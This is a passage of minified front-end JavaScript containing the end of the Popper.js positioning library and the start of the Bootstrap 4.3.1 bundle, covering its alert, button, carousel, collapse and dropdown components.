Math.max(c[t], g[t])), y({}, t, e) }, secondary: function (t) { var e = "right" === t ? "left" : "top", n = c[e]; return c[t] > g[t] && !i.escapeWithReference && (n = Math.min(c[e], g[t] - ("right" === t ? c.width : c.height))), y({}, e, n) } }; return l.forEach(function (t) { var e = -1 !== ["left", "top"].indexOf(t) ? "primary" : "secondary"; c = v({}, c, I[e](t)) }), t.offsets.popper = c, t }, priority: ["left", "right", "top", "bottom"], padding: 5, boundariesElement: "scrollParent" }, keepTogether: { order: 400, enabled: !0, fn: function (t) { var e = t.offsets, n = e.popper, i = e.reference, o = t.placement.split("-")[0], a = Math.floor, s = -1 !== ["top", "bottom"].indexOf(o), r = s ? "right" : "bottom", g = s ? "left" : "top", l = s ? "width" : "height"; return n[r] < a(i[g]) && (t.offsets.popper[g] = a(i[g]) - n[l]), n[g] > a(i[r]) && (t.offsets.popper[g] = a(i[r])), t } }, arrow: { order: 500, enabled: !0, fn: function (t, e) { var n; if (!L(t.instance.modifiers, "arrow", "keepTogether")) return t; var i = e.element; if ("string" == typeof i) { if (!(i = t.instance.popper.querySelector(i))) return t } else if (!t.instance.popper.contains(i)) return console.warn("WARNING: `arrow.element` must be child of its popper element!"), t; var o = t.placement.split("-")[0], a = t.offsets, s = a.popper, r = a.reference, g = -1 !== ["left", "right"].indexOf(o), l = g ? "height" : "width", c = g ? "Top" : "Left", I = c.toLowerCase(), u = g ? "left" : "top", h = g ? "bottom" : "right", d = k(i)[l]; r[h] - d < s[I] && (t.offsets.popper[I] -= s[I] - (r[h] - d)), r[I] + d > s[h] && (t.offsets.popper[I] += r[I] + d - s[h]), t.offsets.popper = x(t.offsets.popper); var C = r[I] + r[l] / 2 - d / 2, A = b(t.instance.popper), p = parseFloat(A["margin" + c], 10), m = parseFloat(A["border" + c + "Width"], 10), f = C - t.offsets.popper[I] - p - m, f = Math.max(Math.min(s[l] - d, f), 0); return t.arrowElement = i, t.offsets.arrow = (y(n = {}, I, Math.round(f)), y(n, u, ""), n), t }, element: "[x-arrow]" }, flip: { order: 600, enabled: !0, fn: function (A, p) { if (N(A.instance.modifiers, "inner")) return A; if (A.flipped && A.placement === A.originalPlacement) return A; var m = w(A.instance.popper, A.instance.reference, p.padding, p.boundariesElement, A.positionFixed), f = A.placement.split("-")[0], b = D(f), B = A.placement.split("-")[1] || "", y = []; switch (p.behavior) { case K: y = [f, b]; break; case J: y = P(f); break; case j: y = P(f, !0); break; default: y = p.behavior }return y.forEach(function (t, e) { if (f !== t || y.length === e + 1) return A; f = A.placement.split("-")[0], b = D(f); var n, i = A.offsets.popper, o = A.offsets.reference, a = Math.floor, s = "left" === f && a(i.right) > a(o.left) || "right" === f && a(i.left) < a(o.right) || "top" === f && a(i.bottom) > a(o.top) || "bottom" === f && a(i.top) < a(o.bottom), r = a(i.left) < a(m.left), g = a(i.right) > a(m.right), l = a(i.top) < a(m.top), c = a(i.bottom) > a(m.bottom), I = "left" === f && r || "right" === f && g || "top" === f && l || "bottom" === f && c, u = -1 !== ["top", "bottom"].indexOf(f), h = !!p.flipVariations && (u && "start" === B && r || u && "end" === B && g || !u && "start" === B && l || !u && "end" === B && c), d = !!p.flipVariationsByContent && (u && "start" === B && g || u && "end" === B && r || !u && "start" === B && c || !u && "end" === B && l), C = h || d; (s || I || C) && (A.flipped = !0, (s || I) && (f = y[e + 1]), C && (B = "end" === (n = B) ? "start" : "start" === n ? "end" : n), A.placement = f + (B ? "-" + B : ""), A.offsets.popper = v({}, A.offsets.popper, Z(A.instance.popper, A.offsets.reference, A.placement)), A = W(A.instance.modifiers, A, "flip")) }), A }, behavior: "flip", padding: 5, boundariesElement: "viewport", flipVariations: !1, flipVariationsByContent: !1 }, inner: { order: 700, enabled: !1, fn: function (t) { var e = t.placement, n = e.split("-")[0], i = t.offsets, o = i.popper, a = i.reference, s = -1 !== ["left", "right"].indexOf(n), r = -1 === ["top", "left"].indexOf(n); return o[s ? "left" : "top"] = a[n] - (r ? o[s ? "width" : "height"] : 0), t.placement = D(e), t.offsets.popper = x(o), t } }, hide: { order: 800, enabled: !0, fn: function (t) { if (!L(t.instance.modifiers, "hide", "preventOverflow")) return t; var e = t.offsets.reference, n = U(t.instance.modifiers, function (t) { return "preventOverflow" === t.name }).boundaries; if (e.bottom < n.top || e.left > n.right || e.top > n.bottom || e.right < n.left) { if (!0 === t.hide) return t; t.hide = !0, t.attributes["x-out-of-boundaries"] = "" } else { if (!1 === t.hide) return t; t.hide = !1, t.attributes["x-out-of-boundaries"] = !1 } return t } }, computeStyle: { order: 850, enabled: !0, fn: function (t, e) { var n = e.x, i = e.y, o = t.offsets.popper, a = U(t.instance.modifiers, function (t) { return "applyStyle" === t.name }).gpuAcceleration; void 0 !== a && console.warn("WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!"); var s, r, g = void 0 !== a ? a : e.gpuAcceleration, l = f(t.instance.popper), c = F(l), I = { position: o.position }, u = _(t, window.devicePixelRatio < 2 || !V), h = "bottom" === n ? "top" : "bottom", d = "right" === i ? "left" : "right", C = T("transform"), A = void 0, p = void 0, p = "bottom" == h ? "HTML" === l.nodeName ? -l.clientHeight + u.bottom : -c.height + u.bottom : u.top, A = "right" == d ? "HTML" === l.nodeName ? -l.clientWidth + u.right : -c.width + u.right : u.left; g && C ? (I[C] = "translate3d(" + A + "px, " + p + "px, 0)", I[h] = 0, I[d] = 0, I.willChange = "transform") : (s = "bottom" == h ? -1 : 1, r = "right" == d ? -1 : 1, I[h] = p * s, I[d] = A * r, I.willChange = h + ", " + d); var m = { "x-placement": t.placement }; return t.attributes = v({}, m, t.attributes), t.styles = v({}, I, t.styles), t.arrowStyles = v({}, t.offsets.arrow, t.arrowStyles), t }, gpuAcceleration: !0, x: "bottom", y: "right" }, applyStyle: { order: 900, enabled: !0, fn: function (t) { var e, n; return O(t.instance.popper, t.styles), e = t.instance.popper, n = t.attributes, Object.keys(n).forEach(function (t) { !1 !== n[t] ? e.setAttribute(t, n[t]) : e.removeAttribute(t) }), t.arrowElement && Object.keys(t.arrowStyles).length && O(t.arrowElement, t.arrowStyles), t }, onLoad: function (t, e, n, i, o) { var a = S(o, e, t, n.positionFixed), s = X(n.placement, a, e, t, n.modifiers.flip.boundariesElement, n.modifiers.flip.padding); return e.setAttribute("x-placement", s), O(e, { position: n.positionFixed ? "fixed" : "absolute" }), n }, gpuAcceleration: void 0 } } }, tt = (u(et, [{ key: "update", value: function () { return function () { var t; this.state.isDestroyed || ((t = { instance: this, styles: {}, arrowStyles: {}, attributes: {}, flipped: !1, offsets: {} }).offsets.reference = S(this.state, this.popper, this.reference, this.options.positionFixed), t.placement = X(this.options.placement, t.offsets.reference, this.popper, this.reference, this.options.modifiers.flip.boundariesElement, this.options.modifiers.flip.padding), t.originalPlacement = t.placement, t.positionFixed = this.options.positionFixed, t.offsets.popper = Z(this.popper, t.offsets.reference, t.placement), t.offsets.popper.position = this.options.positionFixed ? "fixed" : "absolute", t = W(this.modifiers, t), this.state.isCreated ? this.options.onUpdate(t) : (this.state.isCreated = !0, this.options.onCreate(t))) }.call(this) } }, { key: "destroy", value: function () { return function () { return this.state.isDestroyed = !0, N(this.modifiers, "applyStyle") && (this.popper.removeAttribute("x-placement"), this.popper.style.position = "", this.popper.style.top = "", this.popper.style.left = "", this.popper.style.right = "", this.popper.style.bottom = "", this.popper.style.willChange = "", this.popper.style[T("transform")] = ""), this.disableEventListeners(), this.options.removeOnDestroy && this.popper.parentNode.removeChild(this.popper), this }.call(this) } }, { key: "enableEventListeners", value: function () { return function () { this.state.eventsEnabled || (this.state = E(this.reference, this.options, this.state, this.scheduleUpdate)) }.call(this) } }, { key: "disableEventListeners", value: function () { return R.call(this) } }]), et); function et(t, e) { var n = this, i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {}; l(this, et), this.scheduleUpdate = function () { return requestAnimationFrame(n.update) }, this.update = a(this.update.bind(this)), this.options = v({}, et.Defaults, i), this.state = { isDestroyed: !1, isCreated: !1, scrollParents: [] }, this.reference = t && t.jquery ? t[0] : t, this.popper = e && e.jquery ? e[0] : e, this.options.modifiers = {}, Object.keys(v({}, et.Defaults.modifiers, i.modifiers)).forEach(function (t) { n.options.modifiers[t] = v({}, et.Defaults.modifiers[t] || {}, i.modifiers ? i.modifiers[t] : {}) }), this.modifiers = Object.keys(this.options.modifiers).map(function (t) { return v({ name: t }, n.options.modifiers[t]) }).sort(function (t, e) { return t.order - e.order }), this.modifiers.forEach(function (t) { t.enabled && s(t.onLoad) && t.onLoad(n.reference, n.popper, n.options, t, n.state) }), this.update(); var o = this.options.eventsEnabled; o && this.enableEventListeners(), this.state.eventsEnabled = o } return tt.Utils = ("undefined" != typeof window ? window : global).PopperUtils, tt.placements = M, tt.Defaults = q, tt }), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? e(exports, require("jquery"), require("popper.js")) : "function" == typeof define && define.amd ? define(["exports", "jquery", "popper.js"], e) : e((t = t || self).bootstrap = {}, t.jQuery, t.Popper) }(this, function (t, d, I) { "use strict"; function i(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } function a(t, e, n) { return e && i(t.prototype, e), n && i(t, n), t } function s(o) { for (var t = 1; t < arguments.length; t++) { var a = null != arguments[t] ? arguments[t] : {}, e = Object.keys(a); "function" == typeof Object.getOwnPropertySymbols && (e = e.concat(Object.getOwnPropertySymbols(a).filter(function (t) { return Object.getOwnPropertyDescriptor(a, t).enumerable }))), e.forEach(function (t) { var e, n = o, i = a[e = t]; e in n ? Object.defineProperty(n, e, { value: i, enumerable: !0, configurable: !0, writable: !0 }) : n[e] = i }) } return o } d = d && d.hasOwnProperty("default") ? d.default : d, I = I && I.hasOwnProperty("default") ? I.default : I; var e = "transitionend"; var C = { TRANSITION_END: "bsTransitionEnd", getUID: function (t) { for (; t += ~~(1e6 * Math.random()), document.getElementById(t);); return t }, getSelectorFromElement: function (t) { var e, n = t.getAttribute("data-target"); n && "#" !== n || (n = (e = t.getAttribute("href")) && "#" !== e ? e.trim() : ""); try { return document.querySelector(n) ? n : null } catch (t) { return null } }, getTransitionDurationFromElement: function (t) { if (!t) return 0; var e = d(t).css("transition-duration"), n = d(t).css("transition-delay"), i = parseFloat(e), o = parseFloat(n); return i || o ? (e = e.split(",")[0], n = n.split(",")[0], 1e3 * (parseFloat(e) + parseFloat(n))) : 0 }, reflow: function (t) { return t.offsetHeight }, triggerTransitionEnd: function (t) { d(t).trigger(e) }, supportsTransitionEnd: function () { return Boolean(e) }, isElement: function (t) { return (t[0] || t).nodeType }, typeCheckConfig: function (t, e, n) { for (var i in n) if (Object.prototype.hasOwnProperty.call(n, i)) { var o = n[i], a = e[i], s = a && C.isElement(a) ? "element" : {}.toString.call(a).match(/\s([a-z]+)/i)[1].toLowerCase(); if (!new RegExp(o).test(s)) throw new Error(t.toUpperCase() + ': Option "' + i + '" provided type "' + s + '" but expected type "' + o + '".') } }, findShadowRoot: function (t) { if (!document.documentElement.attachShadow) return null; if ("function" != typeof t.getRootNode) return t instanceof ShadowRoot ? t : t.parentNode ? C.findShadowRoot(t.parentNode) : null; var e = t.getRootNode(); return e instanceof ShadowRoot ? e : null } }; d.fn.emulateTransitionEnd = function (t) { var e = this, n = !1; return d(this).one(C.TRANSITION_END, function () { n = !0 }), setTimeout(function () { n || C.triggerTransitionEnd(e) }, t), this }, d.event.special[C.TRANSITION_END] = { bindType: e, delegateType: e, handle: function (t) { if (d(t.target).is(this)) return t.handleObj.handler.apply(this, arguments) } }; var n, o = "alert", r = "bs.alert", g = "." + r, l = d.fn[o], c = { CLOSE: "close" + g, CLOSED: "closed" + g, CLICK_DATA_API: "click" + g + ".data-api" }, u = ((n = h.prototype).close = function (t) { var e = this._element; t && (e = this._getRootElement(t)), this._triggerCloseEvent(e).isDefaultPrevented() || this._removeElement(e) }, n.dispose = function () { d.removeData(this._element, r), this._element = null }, n._getRootElement = function (t) { var e = C.getSelectorFromElement(t), n = !1; return e && (n = document.querySelector(e)), n = n || d(t).closest(".alert")[0] }, n._triggerCloseEvent = function (t) { var e = d.Event(c.CLOSE); return d(t).trigger(e), e }, n._removeElement = function (e) { var t, n = this; d(e).removeClass("show"), d(e).hasClass("fade") ? (t = C.getTransitionDurationFromElement(e), d(e).one(C.TRANSITION_END, function (t) { return n._destroyElement(e, t) }).emulateTransitionEnd(t)) : this._destroyElement(e) }, n._destroyElement = function (t) { d(t).detach().trigger(c.CLOSED).remove() }, h._jQueryInterface = function (n) { return this.each(function () { var t = d(this), e = t.data(r); e || (e = new h(this), t.data(r, e)), "close" === n && e[n](this) }) }, h._handleDismiss = function (e) { return function (t) { t && t.preventDefault(), e.close(this) } }, a(h, null, [{ key: "VERSION", get: function () { return "4.3.1" } }]), h); function h(t) { this._element = t } d(document).on(c.CLICK_DATA_API, '[data-dismiss="alert"]', u._handleDismiss(new u)), d.fn[o] = u._jQueryInterface, d.fn[o].Constructor = u, d.fn[o].noConflict = function () { return d.fn[o] = l, u._jQueryInterface }; var A, p = "button", m = "bs.button", f = "." + m, b = ".data-api", B = d.fn[p], y = "active", v = '[data-toggle^="button"]', x = { CLICK_DATA_API: "click" + f + b, FOCUS_BLUR_DATA_API: "focus" + f + b + " blur" + f + b }, F = ((A = Q.prototype).toggle = function () { var t = !0, e = !0, n = d(this._element).closest('[data-toggle="buttons"]')[0]; if (n) { var i, o = this._element.querySelector('input:not([type="hidden"])'); if (o) { if ("radio" === o.type && (o.checked && this._element.classList.contains(y) ? t = !1 : (i = n.querySelector(".active")) && d(i).removeClass(y)), t) { if (o.hasAttribute("disabled") || n.hasAttribute("disabled") || o.classList.contains("disabled") || n.classList.contains("disabled")) return; o.checked = !this._element.classList.contains(y), d(o).trigger("change") } o.focus(), e = !1 } } e && this._element.setAttribute("aria-pressed", !this._element.classList.contains(y)), t && d(this._element).toggleClass(y) }, A.dispose = function () { d.removeData(this._element, m), this._element = null }, Q._jQueryInterface = function (e) { return this.each(function () { var t = d(this).data(m); t || (t = new Q(this), d(this).data(m, t)), "toggle" === e && t[e]() }) }, a(Q, null, [{ key: "VERSION", get: function () { return "4.3.1" } }]), Q); function Q(t) { this._element = t } d(document).on(x.CLICK_DATA_API, v, function (t) { t.preventDefault(); var e = t.target; d(e).hasClass("btn") || (e = d(e).closest(".btn")), F._jQueryInterface.call(d(e), "toggle") }).on(x.FOCUS_BLUR_DATA_API, v, function (t) { var e = d(t.target).closest(".btn")[0]; d(e).toggleClass("focus", /^focus(in)?$/.test(t.type)) }), d.fn[p] = F._jQueryInterface, d.fn[p].Constructor = F, d.fn[p].noConflict = function () { return d.fn[p] = B, F._jQueryInterface }; var G, w = "carousel", X = "bs.carousel", S = "." + X, k = ".data-api", D = d.fn[w], Z = { interval: 5e3, keyboard: !0, slide: !1, pause: "hover", wrap: !0, touch: !0 }, U = { interval: "(number|boolean)", keyboard: "boolean", slide: "(boolean|string)", pause: "(string|boolean)", wrap: "boolean", touch: "boolean" }, W = "next", N = "prev", T = { SLIDE: "slide" + S, SLID: "slid" + S, KEYDOWN: "keydown" + S, MOUSEENTER: "mouseenter" + S, MOUSELEAVE: "mouseleave" + S, TOUCHSTART: "touchstart" + S, TOUCHMOVE: "touchmove" + S, TOUCHEND: "touchend" + S, POINTERDOWN: "pointerdown" + S, POINTERUP: "pointerup" + S, DRAG_START: "dragstart" + S, LOAD_DATA_API: "load" + S + k, CLICK_DATA_API: "click" + S + k }, H = "active", E = ".active.carousel-item", R = { TOUCH: "touch", PEN: "pen" }, Y = ((G = O.prototype).next = function () { this._isSliding || this._slide(W) }, G.nextWhenVisible = function () { !document.hidden && d(this._element).is(":visible") && "hidden" !== d(this._element).css("visibility") && this.next() }, G.prev = function () { this._isSliding || this._slide(N) }, G.pause = function (t) { t || (this._isPaused = !0), this._element.querySelector(".carousel-item-next, .carousel-item-prev") && (C.triggerTransitionEnd(this._element), this.cycle(!0)), clearInterval(this._interval), this._interval = null }, G.cycle = function (t) { t || (this._isPaused = !1), this._interval && (clearInterval(this._interval), this._interval = null), this._config.interval && !this._isPaused && (this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval)) }, G.to = function (t) { var e = this; this._activeElement = this._element.querySelector(E); var n = this._getItemIndex(this._activeElement); if (!(t > this._items.length - 1 || t < 0)) if (this._isSliding) d(this._element).one(T.SLID, function () { return e.to(t) }); else { if (n === t) return this.pause(), void this.cycle(); var i = n < t ? W : N; this._slide(i, this._items[t]) } }, G.dispose = function () { d(this._element).off(S), d.removeData(this._element, X), this._items = null, this._config = null, this._element = null, this._interval = null, this._isPaused = null, this._isSliding = null, this._activeElement = null, this._indicatorsElement = null }, G._getConfig = function (t) { return t = s({}, Z, t), C.typeCheckConfig(w, t, U), t }, G._handleSwipe = function () { var t, e = Math.abs(this.touchDeltaX); e <= 40 || (0 < (t = e / this.touchDeltaX) && this.prev(), t < 0 && this.next()) }, G._addEventListeners = function () { var e = this; this._config.keyboard && d(this._element).on(T.KEYDOWN, function (t) { return e._keydown(t) }), "hover" === this._config.pause && d(this._element).on(T.MOUSEENTER, function (t) { return e.pause(t) }).on(T.MOUSELEAVE, function (t) { return e.cycle(t) }), this._config.touch && this._addTouchEventListeners() }, G._addTouchEventListeners = function () { var t, e, n = this; this._touchSupported && (t = function (t) { n._pointerEvent && R[t.originalEvent.pointerType.toUpperCase()] ? n.touchStartX = t.originalEvent.clientX : n._pointerEvent || (n.touchStartX = t.originalEvent.touches[0].clientX) }, e = function (t) { n._pointerEvent && R[t.originalEvent.pointerType.toUpperCase()] && (n.touchDeltaX = t.originalEvent.clientX - n.touchStartX), n._handleSwipe(), "hover" === n._config.pause && (n.pause(), n.touchTimeout && clearTimeout(n.touchTimeout), n.touchTimeout = setTimeout(function (t) { return n.cycle(t) }, 500 + n._config.interval)) }, d(this._element.querySelectorAll(".carousel-item img")).on(T.DRAG_START, function (t) { return t.preventDefault() }), this._pointerEvent ? (d(this._element).on(T.POINTERDOWN, t), d(this._element).on(T.POINTERUP, e), this._element.classList.add("pointer-event")) : (d(this._element).on(T.TOUCHSTART, t), d(this._element).on(T.TOUCHMOVE, function (t) { var e; (e = t).originalEvent.touches && 1 < e.originalEvent.touches.length ? n.touchDeltaX = 0 : n.touchDeltaX = e.originalEvent.touches[0].clientX - n.touchStartX }), d(this._element).on(T.TOUCHEND, e))) }, G._keydown = function (t) { if (!/input|textarea/i.test(t.target.tagName)) switch (t.which) { case 37: t.preventDefault(), this.prev(); break; case 39: t.preventDefault(), this.next() } }, G._getItemIndex = function (t) { return this._items = t && t.parentNode ? [].slice.call(t.parentNode.querySelectorAll(".carousel-item")) : [], this._items.indexOf(t) }, G._getItemByDirection = function (t, e) { var n = t === W, i = t === N, o = this._getItemIndex(e), a = this._items.length - 1; if ((i && 0 === o || n && o === a) && !this._config.wrap) return e; var s = (o + (t === N ? -1 : 1)) % this._items.length; return -1 == s ? this._items[this._items.length - 1] : this._items[s] }, G._triggerSlideEvent = function (t, e) { var n = this._getItemIndex(t), i = this._getItemIndex(this._element.querySelector(E)), o = d.Event(T.SLIDE, { relatedTarget: t, direction: e, from: i, to: n }); return d(this._element).trigger(o), o }, G._setActiveIndicatorElement = function (t) { var e, n; this._indicatorsElement && (e = [].slice.call(this._indicatorsElement.querySelectorAll(".active")), d(e).removeClass(H), (n = this._indicatorsElement.children[this._getItemIndex(t)]) && d(n).addClass(H)) }, G._slide = function (t, e) { var n, i, o, a, s, r = this, g = this._element.querySelector(E), l = this._getItemIndex(g), c = e || g && this._getItemByDirection(t, g), I = this._getItemIndex(c), u = Boolean(this._interval), h = t === W ? (n = "carousel-item-left", i = "carousel-item-next", "left") : (n = "carousel-item-right", i = "carousel-item-prev", "right"); c && d(c).hasClass(H) ? this._isSliding = !1 : !this._triggerSlideEvent(c, h).isDefaultPrevented() && g && c && (this._isSliding = !0, u && this.pause(), this._setActiveIndicatorElement(c), o = d.Event(T.SLID, { relatedTarget: c, direction: h, from: l, to: I }), d(this._element).hasClass("slide") ? (d(c).addClass(i), C.reflow(c), d(g).addClass(n), d(c).addClass(n), a = parseInt(c.getAttribute("data-interval"), 10), this._config.interval = a ? (this._config.defaultInterval = this._config.defaultInterval || this._config.interval, a) : this._config.defaultInterval || this._config.interval, s = C.getTransitionDurationFromElement(g), d(g).one(C.TRANSITION_END, function () { d(c).removeClass(n + " " + i).addClass(H), d(g).removeClass(H + " " + i + " " + n), r._isSliding = !1, setTimeout(function () { return d(r._element).trigger(o) }, 0) }).emulateTransitionEnd(s)) : (d(g).removeClass(H), d(c).addClass(H), this._isSliding = !1, d(this._element).trigger(o)), u && this.cycle()) }, O._jQueryInterface = function (i) { return this.each(function () { var t = d(this).data(X), e = s({}, Z, d(this).data()); "object" == typeof i && (e = s({}, e, i)); var n = "string" == typeof i ? i : e.slide; if (t || (t = new O(this, e), d(this).data(X, t)), "number" == typeof i) t.to(i); else if ("string" == typeof n) { if (void 0 === t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } else e.interval && e.ride && (t.pause(), t.cycle()) }) }, O._dataApiClickHandler = function (t) { var e, n, i, o = C.getSelectorFromElement(this); !o || (e = d(o)[0]) && d(e).hasClass("carousel") && (n = s({}, d(e).data(), d(this).data()), (i = this.getAttribute("data-slide-to")) && (n.interval = !1), O._jQueryInterface.call(d(e), n), i && d(e).data(X).to(i), t.preventDefault()) }, a(O, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return Z } }]), O); function O(t, e) { this._items = null, this._interval = null, this._activeElement = null, this._isPaused = !1, this._isSliding = !1, this.touchTimeout = null, this.touchStartX = 0, this.touchDeltaX = 0, this._config = this._getConfig(e), this._element = t, this._indicatorsElement = this._element.querySelector(".carousel-indicators"), this._touchSupported = "ontouchstart" in document.documentElement || 0 < navigator.maxTouchPoints, this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent), this._addEventListeners() } d(document).on(T.CLICK_DATA_API, "[data-slide], [data-slide-to]", Y._dataApiClickHandler), d(window).on(T.LOAD_DATA_API, function () { for (var t = [].slice.call(document.querySelectorAll('[data-ride="carousel"]')), e = 0, n = t.length; e < n; e++) { var i = d(t[e]); Y._jQueryInterface.call(i, i.data()) } }), d.fn[w] = Y._jQueryInterface, d.fn[w].Constructor = Y, d.fn[w].noConflict = function () { return d.fn[w] = D, Y._jQueryInterface }; var _, V = "collapse", L = "bs.collapse", M = "." + L, z = d.fn[V], P = { toggle: !0, parent: "" }, K = { toggle: "boolean", parent: "(string|element)" }, J = { SHOW: "show" + M, SHOWN: "shown" + M, HIDE: "hide" + M, HIDDEN: "hidden" + M, CLICK_DATA_API: "click" + M + ".data-api" }, j = "show", $ = "collapse", q = "collapsing", tt = "collapsed", et = '[data-toggle="collapse"]', nt = ((_ = it.prototype).toggle = function () { d(this._element).hasClass(j) ? this.hide() : this.show() }, _.show = function () { var t, e, n, i, o, a, s = this; this._isTransitioning || d(this._element).hasClass(j) || (this._parent && 0 === (t = [].slice.call(this._parent.querySelectorAll(".show, .collapsing")).filter(function (t) { return "string" == typeof s._config.parent ? t.getAttribute("data-parent") === s._config.parent : t.classList.contains($) })).length && (t = null), t && (e = d(t).not(this._selector).data(L)) && e._isTransitioning) || (n = d.Event(J.SHOW), d(this._element).trigger(n), n.isDefaultPrevented() || (t && (it._jQueryInterface.call(d(t).not(this._selector), "hide"), e || d(t).data(L, null)), i = this._getDimension(), d(this._element).removeClass($).addClass(q), this._element.style[i] = 0, this._triggerArray.length && d(this._triggerArray).removeClass(tt).attr("aria-expanded", !0), this.setTransitioning(!0), o = "scroll" + (i[0].toUpperCase() + i.slice(1)), a = C.getTransitionDurationFromElement(this._element), d(this._element).one(C.TRANSITION_END, function () { d(s._element).removeClass(q).addClass($).addClass(j), s._element.style[i] = "", s.setTransitioning(!1), d(s._element).trigger(J.SHOWN) }).emulateTransitionEnd(a), this._element.style[i] = this._element[o] + "px")) }, _.hide = function () { var t = this; if (!this._isTransitioning && d(this._element).hasClass(j)) { var e = d.Event(J.HIDE); if (d(this._element).trigger(e), !e.isDefaultPrevented()) { var n = this._getDimension(); this._element.style[n] = this._element.getBoundingClientRect()[n] + "px", C.reflow(this._element), d(this._element).addClass(q).removeClass($).removeClass(j); var i = this._triggerArray.length; if (0 < i) for (var o = 0; o < i; o++) { var a = this._triggerArray[o], s = C.getSelectorFromElement(a); null !== s && (d([].slice.call(document.querySelectorAll(s))).hasClass(j) || d(a).addClass(tt).attr("aria-expanded", !1)) } this.setTransitioning(!0), this._element.style[n] = ""; var r = C.getTransitionDurationFromElement(this._element); d(this._element).one(C.TRANSITION_END, function () { t.setTransitioning(!1), d(t._element).removeClass(q).addClass($).trigger(J.HIDDEN) }).emulateTransitionEnd(r) } } }, _.setTransitioning = function (t) { this._isTransitioning = t }, _.dispose = function () { d.removeData(this._element, L), this._config = null, this._parent = null, this._element = null, this._triggerArray = null, this._isTransitioning = null }, _._getConfig = function (t) { return (t = s({}, P, t)).toggle = Boolean(t.toggle), C.typeCheckConfig(V, t, K), t }, _._getDimension = function () { return d(this._element).hasClass("width") ? "width" : "height" }, _._getParent = function () { var t, n = this; C.isElement(this._config.parent) ? (t = this._config.parent, void 0 !== this._config.parent.jquery && (t = this._config.parent[0])) : t = document.querySelector(this._config.parent); var e = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]', i = [].slice.call(t.querySelectorAll(e)); return d(i).each(function (t, e) { n._addAriaAndCollapsedClass(it._getTargetFromElement(e), [e]) }), t }, _._addAriaAndCollapsedClass = function (t, e) { var n = d(t).hasClass(j); e.length && d(e).toggleClass(tt, !n).attr("aria-expanded", n) }, it._getTargetFromElement = function (t) { var e = C.getSelectorFromElement(t); return e ? document.querySelector(e) : null }, it._jQueryInterface = function (i) { return this.each(function () { var t = d(this), e = t.data(L), n = s({}, P, t.data(), "object" == typeof i && i ? i : {}); if (!e && n.toggle && /show|hide/.test(i) && (n.toggle = !1), e || (e = new it(this, n), t.data(L, e)), "string" == typeof i) { if (void 0 === e[i]) throw new TypeError('No method named "' + i + '"'); e[i]() } }) }, a(it, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return P } }]), it); function it(e, t) { this._isTransitioning = !1, this._element = e, this._config = this._getConfig(t), this._triggerArray = [].slice.call(document.querySelectorAll('[data-toggle="collapse"][href="#' + e.id + '"],[data-toggle="collapse"][data-target="#' + e.id + '"]')); for (var n = [].slice.call(document.querySelectorAll(et)), i = 0, o = n.length; i < o; i++) { var a = n[i], s = C.getSelectorFromElement(a), r = [].slice.call(document.querySelectorAll(s)).filter(function (t) { return t === e }); null !== s && 0 < r.length && (this._selector = s, this._triggerArray.push(a)) } this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle() } d(document).on(J.CLICK_DATA_API, et, function (t) { "A" === t.currentTarget.tagName && t.preventDefault(); var n = d(this), e = C.getSelectorFromElement(this), i = [].slice.call(document.querySelectorAll(e)); d(i).each(function () { var t = d(this), e = t.data(L) ? "toggle" : n.data(); nt._jQueryInterface.call(t, e) }) }), d.fn[V] = nt._jQueryInterface, d.fn[V].Constructor = nt, d.fn[V].noConflict = function () { return d.fn[V] = z, nt._jQueryInterface }; var ot, at = "dropdown", st = "bs.dropdown", rt = "." + st, gt = ".data-api", lt = d.fn[at], ct = new RegExp("38|40|27"), It = { HIDE: "hide" + rt, HIDDEN: "hidden" + rt, SHOW: "show" + rt, SHOWN: "shown" + rt, CLICK: "click" + rt, CLICK_DATA_API: "click" + rt + gt, KEYDOWN_DATA_API: "keydown" + rt + gt, KEYUP_DATA_API: "keyup" + rt + gt }, ut = "disabled", ht = "show", dt = "dropdown-menu-right", Ct = '[data-toggle="dropdown"]', At = ".dropdown-menu", pt = { offset: 0, flip: !0, boundary: "scrollParent", reference: "toggle", display: "dynamic" }, mt = { offset: "(number|string|function)", flip: "boolean", boundary: "(string|element)", reference: "(string|element)", display: "string" }, ft = ((ot = bt.prototype).toggle = function () { if (!this._element.disabled && !d(this._element).hasClass(ut)) { var t = bt._getParentFromElement(this._element), e = d(this._menu).hasClass(ht); if (bt._clearMenus(), !e) { var n = { relatedTarget: this._element }, i = d.Event(It.SHOW, n); if (d(t).trigger(i), !i.isDefaultPrevented()) { if (!this._inNavbar) { if (void 0 === I) throw new TypeError("Bootstrap's dropdowns require Popper.js (https://popper.js.org/)"); var o = this._element; "parent" === this._config.reference ? o = t : C.isElement(this._config.reference) && (o = this._config.reference, void 0 !== this._config.reference.jquery && (o = this._config.reference[0])), "scrollParent" !== this._config.boundary && d(t).addClass("position-static"), this._popper = new I(o, this._menu, this._getPopperConfig()) } "ontouchstart" in document.documentElement && 0 === d(t).closest(".navbar-nav").length && d(document.body).children().on("mouseover", null, d.noop), this._element.focus(), this._element.setAttribute("aria-expanded", !0), d(this._menu).toggleClass(ht), d(t).toggleClass(ht).trigger(d.Event(It.SHOWN, n)) } } } }, ot.show = function () { var t, e, n; this._element.disabled || d(this._element).hasClass(ut) || d(this._menu).hasClass(ht) || (t = { relatedTarget: this._element }, e = d.Event(It.SHOW, t), n = bt._getParentFromElement(this._element), d(n).trigger(e), e.isDefaultPrevented() || (d(this._menu).toggleClass(ht), d(n).toggleClass(ht).trigger(d.Event(It.SHOWN, t)))) }, ot.hide = function () { var t, e, n; this._element.disabled || d(this._element).hasClass(ut) || !d(this._menu).hasClass(ht) || (t = { relatedTarget: this._element }, e = d.Event(It.HIDE, t), n = bt._getParentFromElement(this._element), 